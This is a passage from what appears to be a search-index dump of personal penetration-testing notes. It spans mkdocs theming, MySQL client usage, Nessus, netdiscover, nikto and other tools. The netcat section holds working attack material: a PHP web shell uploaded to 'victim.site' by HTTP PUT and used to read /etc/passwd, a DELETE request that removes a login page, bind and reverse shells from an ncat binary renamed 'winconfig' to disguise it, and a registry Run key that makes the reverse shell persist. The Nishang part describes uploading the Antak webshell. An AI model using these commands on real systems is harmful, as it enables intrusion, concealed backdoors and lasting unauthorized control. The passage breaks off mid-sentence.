extensionName\n</code></pre>"},{"location":"my-mkdocs-material-customization/#admonition-extension","title":"Admonition extension","text":"<p>Source: https://squidfunk.github.io/mkdocs-material/reference/admonitions/</p> <p>In mkdocs.yml: </p> <pre><code>markdown_extensions:\n    - admonition\n    - pymdownx.details \n    - pymdownx.superfences\n</code></pre>"},{"location":"my-mkdocs-material-customization/#basic-syntax","title":"Basic syntax","text":"<p>Code in the document:</p> <pre><code>!!! note \"title\"\n\n    Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et euismod \n    nulla. \n</code></pre> <p>How it is seen:</p> <p>title</p> <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla et  euismod nulla.</p> <p>Admonitions follow a simple syntax: a block starts with\u00a0<code>!!!</code>, followed by a single keyword used as a\u00a0type qualifier. The content of the block follows on the next line, indented by four spaces</p> <pre><code>!!! &lt;typeofchart&gt; \"title\"\n</code></pre> <p>When\u00a0Details\u00a0is enabled and an admonition block is started with\u00a0<code>???</code>\u00a0instead of\u00a0<code>!!!</code>, the admonition is rendered as a collapsible block with a small toggle on the right side.</p> <p>These are the type qualifier:  <code>note</code> <code>abstract</code> <code>info</code> <code>tip</code> <code>success</code> <code>question</code> <code>warning</code> <code>failure</code> <code>danger</code> <code>bug</code> <code>example</code> <code>quote</code></p>"},{"location":"my-mkdocs-material-customization/#content-tabs","title":"Content tabs","text":"<p>Source: https://squidfunk.github.io/mkdocs-material/reference/content-tabs/</p> <p>In mkdocs.yml:</p> <pre><code>markdown_extensions:\n  - pymdownx.superfences\n  - pymdownx.tabbed:\n      alternate_style: true \n</code></pre> <p>Code in the document:</p> <pre><code>=== \"Left\"\n    Content\n\n=== \"Center\"\n    Content\n\n=== \"Right\"\n    Content\n</code></pre> <p>How it is seen:</p> LeftCenterRight <p>Content</p> <p>Content</p> <p>Content</p>"},{"location":"my-mkdocs-material-customization/#data-tables","title":"Data tables","text":"<p>Source: https://squidfunk.github.io/mkdocs-material/reference/data-tables/#customization</p> <p>In mkdocs.yml:</p> <pre><code> extra_javascript:\n      - https://unpkg.com/tablesort@5.3.0/dist/tablesort.min.js\n      - javascripts/tablesort.js\n</code></pre> <p>After applying the customization, data tables can be sorted by clicking on a column-. This is code in the document</p> Data table, columns sortable<pre><code>| Method      | Description                          |\n| ----------- | ------------------------------------ |\n| `GET`       | Fetch resource  |\n| `PUT`       | Update resource |\n| `DELETE`    | Delete resource |\n</code></pre> <p>This is how it is seen:</p> Method Description <code>GET</code> Fetch resource <code>PUT</code> Update resource <code>DELETE</code> Delete resource"},{"location":"my-mkdocs-material-customization/#pdf-button-in-every-page","title":"PDF button in every page","text":"<p>Most of the existing plugins offer a print-all-in-one-file solution, which is not my intended development.</p>"},{"location":"my-mkdocs-material-customization/#mkdocs-pdf-export-plugin","title":"mkdocs-pdf-export-plugin","text":"<p>https://github.com/zhaoterryy/mkdocs-pdf-export-plugin</p> <p>Install and add to gh-deploy workflow:</p> <pre><code>pip install mkdocs-pdf-export-plugin\n</code></pre> <p>mkdocs.yml</p> <pre><code>plugins:\n    - search\n    - pdf-export:\n        verbose: true\n        combined: false\n        media_type: print\n        enabled_if_env: ENABLE_PDF_EXPORT\n</code></pre> <p>/docs/css/extra.css</p> <pre><code>@page {\n    size: a4 portrait;\n    margin: 25mm 10mm 25mm 10mm;\n    counter-increment: page;\n    font-family: \"Roboto\",\"Helvetica Neue\",Helvetica,Arial,sans-serif;\n    white-space: pre;\n    color: grey;\n    @top-left {\n        content: '\u00a9 2018 My Company';\n    }\n    @top-center {\n        content: string(chapter);\n    }\n    @top-right {\n        content: 'Page ' counter(page);\n    }\n}\n</code></pre>"},{"location":"my-mkdocs-material-customization/#resolving-relative-link-issues-when-rendering","title":"Resolving relative link issues when rendering","text":"<p>https://octoprint.github.io/mkdocs-site-urls/</p>"},{"location":"my-mkdocs-material-customization/#revision-date","title":"Revision date","text":"<p>https://timvink.github.io/mkdocs-git-revision-date-localized-plugin/ ]</p> <p>Install and add to gh-deploy workflow:</p> <pre><code># Installs git revision date plugin globally\npip install mkdocs-git-revision-date-plugin\n</code></pre> <p>mkdocs.yml</p> <pre><code># Adding the git revision date plugin\nplugins:\n- search\n- git-revision-date\n    type: timeago \n    timezone: Europe/Amsterdam \n    fallback_to_build_date: false \n    enable_creation_date: true \n    exclude: \n    - index.md \n    enabled: true \n    strict: true\n</code></pre> <p>This plugin needs access to the last commit that touched a specific file to be able to retrieve the date. By default many build environments only retrieve the last commit, which means you might need to:</p> <ul> <li>github actions: set\u00a0<code>fetch-depth</code>\u00a0to\u00a0<code>0</code>\u00a0(docs)</li> </ul> <p>Types</p> <pre><code>November 28, 2019           # type: date (default)\nNovember 28, 2019 13:57:28  # type: datetime\n2019-11-28                  # type: iso_date\n2019-11-28 13:57:26         # type: iso_datetime\n20 hours ago                # type: timeago\n28. November 2019           # type: custom\n</code></pre> <p>To add a revision date to the default\u00a0<code>mkdocs</code>\u00a0theme, add a\u00a0<code>overrides/partials</code>\u00a0folder to your\u00a0<code>docs</code>\u00a0folder and update your\u00a0<code>mkdocs.yml</code>\u00a0file. Then you can extend the base\u00a0<code>mkdocs</code>\u00a0theme by adding a new file\u00a0<code>docs/overrides/content.html</code>:</p> :octicons-file-code-16: mkdocs.yml <pre><code>```yaml\ntheme:\n    name: mkdocs\n    custom_dir: docs/overrides\n```\n</code></pre> :octicons-file-code-16: docs/hackinglifetheme/partials/content.html <pre><code>```html\n&lt;!-- Overwrites content.html base mkdocs theme, taken from \nhttps://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html --&gt;\n\n{% if page.meta.source %}\n    &lt;div class=\"source-links\"&gt;\n    {% for filename in page.meta.source %}\n        &lt;span class=\"label label-primary\"&gt;{{ filename }}&lt;/span&gt;\n    {% endfor %}\n    &lt;/div&gt;\n{% endif %}\n\n{{ page.content }}\n\n&lt;!-- This section adds support for localized revision dates --&gt;\n{% if page.meta.git_revision_date_localized %}\n    &lt;small&gt;Last update: {{ page.meta.git_revision_date_localized }}&lt;/small&gt;\n{% endif %}\n{% if page.meta.git_created_date_localized %}\n    &lt;small&gt;Created: {{ page.meta.git_created_date_localized_raw_datetime }}&lt;/small&gt;\n{% endif %}\n```\n</code></pre>"},{"location":"mybb-pentesting/","title":"Pentesting MyBB","text":"<p>Once we know we are in front of a MyBB CMS, one useful tool would be MyBBscan.</p>","tags":["MyBB","pentesting","CMS"]},{"location":"mybb-pentesting/#mybbscan","title":"MyBBScan","text":"<p>Original repo: https://github.com/0xB9/MyBBscan.</p> <p>My forked repo: https://github.com/amandaguglieri/CMS-MyBBscan.</p>","tags":["MyBB","pentesting","CMS"]},{"location":"mysql/","title":"MySQL","text":"<p>MySQL: MySQL is an open-source relational database management system(RDBMS) based on Structured Query Language (SQL). It is developed and managed by oracle corporation and initially released on 23 may, 1995. It is widely being used in many small and large scale industrial applications and capable of handling a large volume of data. After the acquisition of MySQL by Oracle, some issues happened with the usage of the database and hence MariaDB was developed.</p> <p>By default, MySQL uses\u00a0<code>TCP/3306</code>.</p>","tags":["database","relational database","SQL"]},{"location":"mysql/#authentication-mechanisms","title":"Authentication Mechanisms","text":"<p>MySQL  supports different authentication methods, such as username and password, as well as Windows authentication (a plugin is required).</p> <p><code>MySQL</code>\u00a0default system schemas/databases:</p> <ul> <li><code>mysql</code>\u00a0- is the system database that contains tables that store information required by the MySQL server</li> <li><code>information_schema</code>\u00a0- provides access to database metadata</li> <li><code>performance_schema</code>\u00a0- is a feature for monitoring MySQL Server execution at a low level</li> <li><code>sys</code>\u00a0- a set of objects that helps DBAs and developers interpret data collected by the Performance Schema</li> </ul>","tags":["database","relational database","SQL"]},{"location":"mysql/#footprinting-mysql","title":"Footprinting mysql","text":"<pre><code>sudo nmap $ip -sV -sC -p3306 --script mysql*\n</code></pre>","tags":["database","relational database","SQL"]},{"location":"mysql/#connect-to-database-mysql","title":"Connect to database: mysql","text":"","tags":["database","relational database","SQL"]},{"location":"mysql/#from-linux","title":"From Linux","text":"<pre><code>mysql -u username -pPassword123 -h $ip \n# -h host/ip   \n# -u user As default mysql has a root user with no authentication\n\nmysql --host=INSTANCE_IP --user=root --password=thepassword\nmysql -h &lt;host/IP&gt; -u root -p&lt;password&gt;\nmysql -u root -h &lt;host/IP&gt;\n\nmysql -u root -h example.com -P 3306 -pPassword123\n# -P: port\n</code></pre>","tags":["database","relational database","SQL"]},{"location":"mysql/#sqsh","title":"sqsh","text":"<pre><code># Targeting a local account:\nsqsh -S $ip -U &lt;username&gt; -P 'MyPassword!' -h\n\n# Targeting Windows authentication\nsqsh -S $ip -U .\\\\username -P 'MyPassword!' -h\n# -h: disable headers and footers for a cleaner look.\n</code></pre>","tags":["database","relational database","SQL"]},{"location":"mysql/#mssqlclientpy-from-impacket","title":"mssqlclient.py from impacket","text":"<pre><code>mssqlclient.py -p $port username@$ip \n</code></pre> <p>If we can guess or gain access to credentials, this allows us to remotely connect to the MSSQL server and start interacting with databases using T-SQL (<code>Transact-SQL</code>). Authenticating with MSSQL will enable us to interact directly with databases through the SQL Database Engine. From Pwnbox or a personal attack host, we can use Impacket's mssqlclient.py to connect as seen in the output below. Once connected to the server, it may be good to get a lay of the land and list the databases present on the system.</p> <pre><code>python3 mssqlclient.py Administrator@$ip -windows-auth  \n# With python3 mssqlclient.py help you can see more options.\n</code></pre>","tags":["database","relational database","SQL"]},{"location":"mysql/#from-windows","title":"From Windows","text":"","tags":["database","relational database","SQL"]},{"location":"mysql/#mysqlexe","title":"mysql.exe","text":"<pre><code>mysql.exe -u username -pPassword123 -h $IP\n</code></pre>","tags":["database","relational database","SQL"]},{"location":"mysql/#sqlcmd","title":"sqlcmd","text":"<pre><code>sqlcmd -S &lt;server&gt; -U &lt;username&gt; -P 'MyPassword!' -y 30 -Y 30\n# When we authenticate to MSSQL using\u00a0`sqlcmd`\u00a0we can use the parameters\u00a0`-y`\u00a0(SQLCMDMAXVARTYPEWIDTH) and\u00a0`-Y`\u00a0(SQLCMDMAXFIXEDTYPEWIDTH) for better looking output. Keep in mind it may affect performance.\n</code></pre>","tags":["database","relational database","SQL"]},{"location":"mysql/#from-gui-application","title":"From GUI Application","text":"","tags":["database","relational database","SQL"]},{"location":"mysql/#server-management-studio-or-ssms","title":"Server Management Studio or SSMS","text":"<p>Download from: SQL Server Management Studio or SSMS</p>","tags":["database","relational database","SQL"]},{"location":"mysql/#mysql-workbench","title":"MySQL Workbench","text":"<p>Download from: https://dev.mysql.com/downloads/workbench/.</p>","tags":["database","relational database","SQL"]},{"location":"mysql/#dbeaver","title":"dbeaver","text":"<p>dbeaver\u00a0is a multi-platform database tool for Linux, macOS, and Windows that supports connecting to multiple database engines such as MSSQL, MySQL, PostgreSQL, among others, making it easy for us, as an attacker, to interact with common database servers.</p> <p>To install\u00a0dbeaver\u00a0using a Debian package we can download the release .deb package from\u00a0https://github.com/dbeaver/dbeaver/releases\u00a0and execute the following command:</p> <pre><code>sudo dpkg -i dbeaver-&lt;version&gt;.deb\n\n# run dbeaver in a second plane\n dbeaver &amp;\n</code></pre>","tags":["database","relational database","SQL"]},{"location":"mysql/#basic-commands","title":"Basic commands","text":"<pre><code># Example:\nSELECT * FROM tableName WHERE username != 'john' AND id &gt; 1;\n</code></pre> <p>Additionally there are two strings that you can use to comment a line in SQL:</p> <ul> <li><code>#</code> The hash symbol.</li> <li><code>--</code>The two dashes followed by a space-</li> </ul> <pre><code># Show datases\nSHOW databases;\n\n# Show tables\nSHOW tables;\n\n# Create new database\nCREATE DATABASE nameofdatabase;\n\n# Delete database\nDROP DATABASE nameofdatabase;\n\n# Select a database\nUSE nameofdatabase;\n\n# Show tables\nSHOW tables;\n\n# DESCRIBE keyword is used to list the table structure with its fields and data types:\nDESCRIBE nameoftable;\n\n# Dump columns from nameOftable\nSELECT * FROM NameOfTable;\n# SELECT name, description FROM products WHERE id=9;\n\n# Another useful SQL clause is LIKE, enabling selecting records by matching a certain pattern. The query below retrieves all records with usernames starting with admin. The % symbol acts as a wildcard and matches all characters after admin. It is used to match zero or more characters. \nSELECT * FROM logins WHERE username LIKE 'admin%';\n\nSELECT * FROM logins WHERE username NOT LIKE 'Bear';\n\n\n\n# Create a table with some columns in the previously selected database\nCREATE TABLE person(nombre VARCHAR(255), edad INT, id INT);\n\n# Modify, add, or remove a column attribute of a table\nALTER TABLE persona DROP edad VARCHAR(200);\nALTER TABLE persona ADD edad VARCHAR(200);\n\n# \u00a0`NOT NULL`\u00a0constraint ensures that a particular column is never left empty\nALTER TABLE persona MODIFY id INT NOT NULL AUTO_INCREMENT;\n\n# `UNIQUE`\u00a0constraint to ensure that the inserted item are always unique\nALTER TABLE persona MODIFY nombre VARCHAR(100) UNIQUE NOT NULL;\n\n# Another important keyword is the\u00a0`DEFAULT`\u00a0keyword, which is used to specify the default value. `Now()` in MySQL returns the current date and time:\nALTER TABLE persona ADD date_of_joining DATETIME DEFAULT NOW();\n\n#\u00a0`PRIMARY KEY`, which we can use to uniquely identify each record in the table\nCREATE TABLE logins (\n    id INT NOT NULL AUTO_INCREMENT,\n    username VARCHAR(100) UNIQUE NOT NULL,\n    password VARCHAR(100) NOT NULL,\n    date_of_joining DATETIME DEFAULT NOW(),\n    PRIMARY KEY (id)\n    );\n\n# Finally, We can use ALTER to change the name of any table and any of its fields or to delete or add a new column to an existing table. T\nALTER TABLE tableName ADD newColumn INT;\n\n# We can also rename a column:\nALTER TABLE tableName RENAME COLUMN newColumn TO oldColumn;\n\n# Or delete a column: \nALTER TABLE tableName DROP oldColumn;\n\n# Insert a new row with values in a table\n# INSERT INTO table_name VALUES (column1_value, column2_value, column3_value, ...);\nINSERT INTO persona VALUES(\"alvaro\", 54, 1);\n\n# Insert a new row with values in a table, but skipping some columns\nINSERT INTO table_name(column2, column3, ...) VALUES (column2_value, column3_value, ...);\n\n# We can also insert multiple records at once by separating them with a comma:\nINSERT INTO logins(username, password) VALUES ('john', 'john123!'), ('tom', 'tom123!');\n\n# Show all columns from table\nSELECT * FROM tableName\n\n# Show only some columns from the table\nSELECT column1,column2 FROM tableName\n\n# Select a row from a table filtering by the value of a given column\nSELECT * FROM persona WHERE nombre=\"alvaro\";\n\n# JOIN query\nSELECT * FROM oficina JOIN persona ON persona.id=oficina.user_id;\n\n# UNION query. This means, for an attack, that the number of columns has to be the same\nSELECT * FROM oficina UNION SELECT * from persona;\n\n# Sorting data on the bases on edad column\nSELECT * FROM persona ORDER BY edad;\n\n# Retrieving first record from the table.\nSELECT * from persona order by edad limit 1;\n\n# Count the number of people stored in persona\nSELECT count(*) from persona;\n\n# Context: a wordpress database\n# Identify how many distinct authors have published a post in the blog\nSELECT DISTINCT(post_author) from wpdatabase.wp_posts;\n\n# Remove tables and databases from server\nDROP TABLE tableName;\n\n# the UPDATE statement can be used to update specific records within a table, based on certain conditions. Its general syntax is:\nUPDATE tableName SET column1=newvalue1, column2=newvalue2, ... WHERE &lt;condition&gt;;\n</code></pre> <pre><code># UNION Statement syntax\n#&lt;SELECT statement&gt; UNION &lt;other SELECT statement&gt;;\n# Example:\nSELECT name, description FROM products WHERE id=9 UNION SELECT price FROM products WHERE id=9;\n</code></pre>","tags":["database","relational database","SQL"]},{"location":"mysql/#enumeration-queries","title":"Enumeration queries","text":"<pre><code># Show current user\ncurrent_user()\nuser()\n\n# Show current database\ndatabase()\n</code></pre>","tags":["database","relational database","SQL"]},{"location":"mysql/#well-know-vulnerabilities","title":"Well-know vulnerabilities","text":"","tags":["database","relational database","SQL"]},{"location":"mysql/#misconfigurations","title":"Misconfigurations","text":"<p>Anonymous access enabled.</p>","tags":["database","relational database","SQL"]},{"location":"mysql/#vulnerabilities","title":"Vulnerabilities","text":"<p><code>MySQL 5.6.x</code>\u00a0servers: \u00a0CVE-2012-2122\u00a0, among others. It allowed us to bypass authentication by repeatedly using the same incorrect password for the given account because the\u00a0<code>timing attack</code>\u00a0vulnerability existed in the way MySQL handled authentication attempts. In this timing attack, MySQL repeatedly attempts to authenticate to a server and measures the time it takes for the server to respond to each attempt. By measuring the time it takes the server to respond, we can determine when the correct password has been found, even if the server does not indicate success or failure.</p>","tags":["database","relational database","SQL"]},{"location":"mythic/","title":"Mythic C2 Framework","text":"<p>https://github.com/its-a-feature/Mythic</p> <p>The Mythic C2 framework is an alternative option to Metasploit as a Command and Control Framework and toolbox for unique payload generation. A cross-platform, post-exploit, red teaming framework built with GoLang, docker, docker-compose, and a web browser UI. It's designed to provide a collaborative and user friendly interface for operators, managers, and reporting throughout red teaming.</p>","tags":["payloads","tools"]},{"location":"nessus/","title":"Nessus","text":"<p>Nessus has a client and a server. We use the client to configure the scans and the server to actually perform the scanning processes and report back the result to the client.</p>","tags":["reconnaissance","scanner","vulnerability assessment"]},{"location":"nessus/#installation","title":"Installation","text":"<p>Download .deb from: https://www.tenable.com/downloads/nessus</p> <pre><code>sudo dpkg -i Nessus-10.3.0-debian9_amdb64.deb\nservice nessusd start\n</code></pre> <p>Now you can go to https://localhost:8834</p> <p>Once installed Nessus Esentials, register in the website to generate an API key.</p> <p>Nessus gives us the option to create scan policies. Essentially these are customized scans that allow us to define specific scan options, save the policy configuration, and have them available to us under Scan Templates when creating a new scan. </p> <p>This gives us the ability to create targeted scans for any number of scenarios, such as a slower, more evasive scan, a web-focused scan, or a scan for a particular client using one or several sets of credentials.</p> <p>To exclude false positives from scan results Under the <code>Resources</code> section, we can select <code>Plugin Rules</code>. In the new plugin rule, we input the host to be excluded, along with the Plugin ID for Microsoft DirectAccess, for instance.</p> <p>Nessus gives us the option to export scan results in a variety of report formats as well as the option to export raw Nessus scan results to be imported into other tools, archived, or passed to tools, such as EyeWitness. Nessus  gives the option to export scans into two formats <code>Nessus (scan.nessus)</code> or <code>Nessus DB (scan.db)</code>.  The <code>.nessus</code> file is an <code>.xml</code> file and includes a copy of the scan settings and plugin outputs. The <code>.db</code> file contains the <code>.nessus</code> file and the scan's KB, plugin Audit Trail, and any scan attachments.</p> <p>Scripts such as the nessus-report-downloader can be used to quickly download scan results in all available formats from the CLI using the Nessus REST API:</p> <pre><code>./nessus_downloader.rb \n</code></pre>","tags":["reconnaissance","scanner","vulnerability assessment"]},{"location":"nessus/#mitigating-issues","title":"Mitigating Issues","text":"<p>1. Some firewalls will cause us to receive scan results showing either all ports open or no ports open. If this happens, a quick fix is often to configure an Advanced Scan and disable the <code>Ping the remote host</code> option.</p> <p>2. Adjust <code>Performance Options</code> and modify <code>Max Concurrent Checks Per Host</code> if the target host is often under heavy load, such as a widely used web application.</p> <p>3. Unless specifically requested, we should never perform Denial of Service checks. The \"safe checks\" setting allows Nessus users to enable a set of plugins within Nessus' library of vulnerability checks which Tenable feels can have negative effects on the network, device or application being tested. </p> <p>4. It is also essential to keep in mind the potential impact of vulnerability scanning on a network, especially on low bandwidth or congested links. This can be measured using vnstat.</p> <pre><code>sudo vnstat -l -i eth0\n</code></pre>","tags":["reconnaissance","scanner","vulnerability assessment"]},{"location":"nessus/#nessus-plugins","title":"Nessus plugins","text":"<p>Nessus works with plugins written in the\u00a0Nessus Attack Scripting Language (NASL)\u00a0and can target new vulnerabilities and CVEs. \u00a0These plugins contain information such as the vulnerability name, impact, remediation, and a way to test for the presence of a particular issue.</p>","tags":["reconnaissance","scanner","vulnerability assessment"]},{"location":"netbios/","title":"NetBIOS - Network Basic Input Output System","text":"<p>NetBIOS stands for Network Basic Input Output System. Basically, servers and clients use NetBIOS when viewing network shares on the local area network.</p> <p>NetBIOS supplies hostname, NetBIOS name, Domain, Network shares when querying a computer. When a MS Windows machine browses a network , it uses NetBIOS:</p> <ul> <li>datagrams to list the shares amd the machines (port 138 / UDP)</li> <li>names to find wrous (port 137 / UDP)</li> <li>sessions to transmit data to and from a windows share (port 139 / TCP )</li> </ul>","tags":["windows"]},{"location":"netbios/#create-a-network-share-in-a-windows-based-environment","title":"Create a network share in a Windows based environment:","text":"<ol> <li>Turn on the File and Printer Sharing service.</li> <li>Choose directories to share</li> </ol> <pre><code>UNC paths (Universal Naming Convention paths) \\\\Servername\\ShareName\\file.nat\n\n\\\\ComputerName\\C$\n\n\\\\ComputerName\\admin$\n\n\\\\ComputerName\\ipc$\u00a0 \u00a0 \u00a0 //inter process communication\n</code></pre>","tags":["windows"]},{"location":"netcat/","title":"netcat","text":"","tags":["http"]},{"location":"netcat/#installation","title":"Installation","text":"<p>Preinstalled in kali. Netcat (often abbreviated to nc) is a computer networking utility for reading from and writing to network connections using TCP or UDP.</p> <p>For windows: https://nmap.org/ncat/.</p> <p>For linux: </p> <pre><code>sudo apt install ncat\n</code></pre>","tags":["http"]},{"location":"netcat/#usage","title":"Usage","text":"<p>It\u2019s used for HTTP</p> <pre><code>nc $ip &lt;port&gt; -flags\n</code></pre>","tags":["http"]},{"location":"netcat/#fingerprinting-with-netcat","title":"Fingerprinting with netcat","text":"<pre><code>nc $ip 80\nHEAD / HTTP/1.0     \n# And hit RETURN twice\n</code></pre> <p>Also, Nmap does not always recognize all information by default. Sometimes you can use netcat to interpelate a service:</p> <pre><code> nc -nv $ip &lt;PORT NUMBER&gt;\n</code></pre>","tags":["http"]},{"location":"netcat/#netcat-commands","title":"Netcat commands","text":"","tags":["http"]},{"location":"netcat/#as-a-server","title":"As a server","text":"<pre><code>nc -lvp 8888\n#-p: specify a port\n#-l: to listening\n#-v: verbosity\n#-u: enforces udp connection\n#-e: executes the given command\n</code></pre>","tags":["http"]},{"location":"netcat/#as-a-client","title":"As a client","text":"<pre><code>nc -v $ip &lt;port&gt;\n</code></pre>","tags":["http"]},{"location":"netcat/#transfer-data","title":"Transfer data","text":"<p>On the server side:</p> <pre><code>#data will be printed on screen\nnc -lvp &lt;port&gt;  \n</code></pre> <p>On the client side:</p> <pre><code>echo \u201chello\u201d | nc -v $ip &lt;port&gt;\n</code></pre>","tags":["http"]},{"location":"netcat/#transfer-data-and-save-it-in-a-file","title":"Transfer data and save it in a file","text":"<p>On the server side: </p> <pre><code># Data will be stored in reveived.txt file.\nnc -lvp &lt;port&gt; &gt; received.txt   \n</code></pre> <p>On the client side:</p> <pre><code>echo \u201chello\u201d | nc -v $ip &lt;port&gt;\n</code></pre>","tags":["http"]},{"location":"netcat/#transfer-file-and-save-it","title":"Transfer file and save it","text":"<p>On the server side: </p> <pre><code># Received data will be stored in reveived.txt file.\nnc -lvp &lt;port&gt; &gt; received.txt   \n</code></pre> <p>On the client side:</p> <pre><code>cat tobesentfiel.txt | nc -v $ip &lt;port&gt;\n</code></pre>","tags":["http"]},{"location":"netcat/#netcat-shell","title":"Netcat shell","text":"<p>On the server side:</p> <pre><code>nc -lvp &lt;port&gt; -e /bin/bash\n</code></pre> <p>On the client side:</p> <pre><code>nc -v $ip &lt;port&gt;\n</code></pre>","tags":["http"]},{"location":"netcat/#some-enumeration-techniques-for-http-verbs","title":"Some enumeration techniques for HTTP verbs","text":"<pre><code># Send a OPTIONS message with netcat\nnc victim.target 80\nOPTIONS / HTTP/1.0\n</code></pre>","tags":["http"]},{"location":"netcat/#some-exploitation-techniques-for-http-verbs","title":"Some exploitation techniques for HTTP verbs","text":"","tags":["http"]},{"location":"netcat/#delete-attack","title":"DELETE attack","text":"<pre><code># General syntax for removing a resource from server using netcat\nnc victim.site 80\nDELETE /path/to/resource.txt HTTP/1.0\n\n\n# Example for removing the login page of a site\nnc victim.site 80\nDELETE /login.php HTTP/1.0\n</code></pre>","tags":["http"]},{"location":"netcat/#put-attack-getting-a-shell","title":"PUT attack: getting a shell","text":"<pre><code># Save for instance a php basic shell in a file (shell.php):\n\n&lt;?php \nif (isset($_GET[\u2018cmd\u2019]))\n{\n    $cmd = $_GET[\u2018cmd\u2019];\n    echo \u2018&lt;pre&gt;\u2019;\n    $result = shell_exec($cmd);\n    echo $result;\n    echo \u2018&lt;/pre&gt;\u2019;\n?&gt;\n\n\n# Count the size of the file\nwc -m shell.php\n\n# Send with netcat the HTTP verb message\nnc victim.site 80\nPUT /shell.php HTTP/1.0\nConten-type: text/html\nContent-length: [number you got with wc -m payload]\n\n\n# Run the exploit by typing in the browser:\nhttp://victim.site/shell.php?cmd=cat+/etc/passwd\n</code></pre>","tags":["http"]},{"location":"netcat/#backdoors-with-netcat","title":"Backdoors with netcat","text":"","tags":["http"]},{"location":"netcat/#the-attacker-initiates-the-connection","title":"The attacker initiates the connection","text":"<p>In the victim machine: If windows, get the ncat.exe executable file, rename it to something else such as winconfig and we write in command line:</p> <pre><code>wincofig -l -p &lt;port&gt; -e cmd.exe\n# Example: wincofig -l -p 5555 -e cmd.exe\n</code></pre> <p>In the attacker machine:</p> <pre><code>ncat &lt;victim IP address&gt; &lt;port specified&gt;\n# Example: ncat 192.168.0.40 5555\n</code></pre>","tags":["http"]},{"location":"netcat/#the-victim-initiates-the-connection","title":"The victim initiates the connection","text":"<p>Great to avoid firewalls!!!</p> <p>In the victim machine: If windows, get the ncat.exe executable file, rename it to something else such as winconfig and we write in command line:</p> <p><pre><code>winconfig -e cmd.exe &lt;attacker IP&gt; &lt;port&gt;\n# Example: winconfig -e cmd.exe 192.168.1.40 5555\n</code></pre> In the attacker machine:</p> <pre><code>ncat -l -p &lt;port&gt; -v\n# Example: ncat -l -p 5555 -v\n</code></pre>","tags":["http"]},{"location":"netcat/#creating-a-registry-in-regedit","title":"Creating a registry in regedit","text":"<ul> <li>In regedit, go to Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run</li> <li>Right-Button &gt; New &gt; String value</li> <li>We name it exactly like the ncat.exe file (if we renamed it to winconfig, then we call this registry winconfig&gt;</li> <li>We edit the registry and we add the path to the executable file and some commands  in the Value data:</li> </ul> <pre><code>\u201cC:\\Windows/System32\\winconfig.exe &lt;attacker IP&gt; &lt;port&gt; -e cmd.exe\u201d\n# For instance: \u201cC:\\Windows/System32\\winconfig.exe 192.168.1.50 5540 -e cmd.exe\u201d\n</code></pre>","tags":["http"]},{"location":"netcraft/","title":"netcraft","text":"<p>Netcraft can offer us information about the servers without even interacting with them, and this is something valuable from a passive information gathering point of view. We can use the service by visiting <code>https://sitereport.netcraft.com</code> and entering the target domain. We need to pay special attention to the latest IPs used. </p> <p>Sometimes we can spot the actual IP address from the webserver before it was placed behind a load balancer, web application firewall, or IDS, allowing us to connect directly to it if the configuration.</p> <p>See Information Gathering phase in a Security assessment.</p>","tags":["web","pentesting","reconnaissance"]},{"location":"netdiscover/","title":"netdiscover - A network enumeration tool based on ARP request","text":"<p>Netdiscover is another discovery tool, built in Kali Linux 2018.2. It performs reconnaissance and discovery on both wireless and switched networks using ARP requests.</p> <p>What is cool about netdiscover? Being nmap a best suited tool for almost everything, netdiscover provides a way to find Internal IP addresses and MAC addresses. That is the difference: netdiscover works only in internal networks. </p>","tags":["reconnaissance","pentesting"]},{"location":"netdiscover/#installation","title":"Installation","text":"<p>Sometimes, you may be given an outdated kali ova with no netdiscover tool installed. To install:</p> <pre><code>sudo apt-get install netdiscover\n</code></pre>","tags":["reconnaissance","pentesting"]},{"location":"netdiscover/#basic-commands","title":"Basic commands","text":"<pre><code># Get help\nnetdiscover -h\n\n# Get all host in an interface and in a range\n# -i: interface\n# -r: range\nnetdiscover -i eth0 -r 192.168.5.42/24 \n</code></pre>","tags":["reconnaissance","pentesting"]},{"location":"network-traffic-capture/","title":"Network traffic capture tools","text":"","tags":["pentesting","network","toolS"]},{"location":"network-traffic-capture/#some-proxy-tools","title":"Some proxy tools","text":"<ul> <li>Wireshark.</li> <li>Netmon (Microsoft Network Monitor).</li> <li>Fiddler: a web debugging proxy.</li> <li>BurpSuite.</li> <li>Echo Mirage: for thick clients:  freeware tool that hooks into an application\u2019s process and enables us to monitor the network interactions being done.</li> <li>Postman.</li> </ul>","tags":["pentesting","network","toolS"]},{"location":"nikto/","title":"nikto","text":"<p>You will get some results related to headers such as, for example:</p> <ul> <li>The anti-clickjacking X-Frame-Options header is not present.</li> <li>The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</li> <li>The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</li> </ul> <p>Run:</p> <pre><code>nikto -h domain.com -o nikto.html -Format html\n\n\nnikto -h http://domain.com/index.php?page=target-page.php -Tuning 5 -Display V\n# -Display V : turn verbose mode on\n# -Tuning 5 : Level 5 is considered aggressive, covering a wide range of tests but may also increase the likelihood of false positives. \n</code></pre>","tags":["web pentesting","reconnaissance","WSTG-INFO-02"]},{"location":"nishang/","title":"Nishang","text":"<p>Nishang is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming. Nishang is useful during all phases of penetration testing.</p>","tags":["payloads","tools"]},{"location":"nishang/#installation","title":"Installation","text":"<p>Download from github repo: https://github.com/samratashok/nishang.</p> <pre><code>sudo apt install nishang\n</code></pre>","tags":["payloads","tools"]},{"location":"nishang/#antak-webshell","title":"Antak Webshell","text":"<p>Antak is a webshell written in ASP.Net which utilizes PowerShell to interact with the host, making it great for acquiring a web shell on a Windows server. Active Server Page Extended (ASPX) is a file type/extension written for Microsoft's ASP.NET Framework. Antak is included within the Nishang project. </p> <p>The Antak files can be found in the <code>/usr/share/nishang/Antak-WebShell</code> directory.</p> <p>When uploaded on a http server in the victim machine, Antak web shell functions like a Powershell Console. However, it will execute each command as a new process. It can also execute scripts in memory and encode commands you send.</p> <p>First step, generate the file you will upload:</p> <pre><code>sudo cp /usr/share/nishang/Antak-WebShell/antak.aspx /path/Upload.aspx\n</code></pre> <p>Set credentials for access to the web shell. Modify\u00a0<code>line 14</code>, adding a user and password.</p> <p></p> <p>Open the browser and upload the file to the web app.  Open the url  //files/Upload.aspx and enter user and password.</p> <p></p> <p>Now that we have access, we can 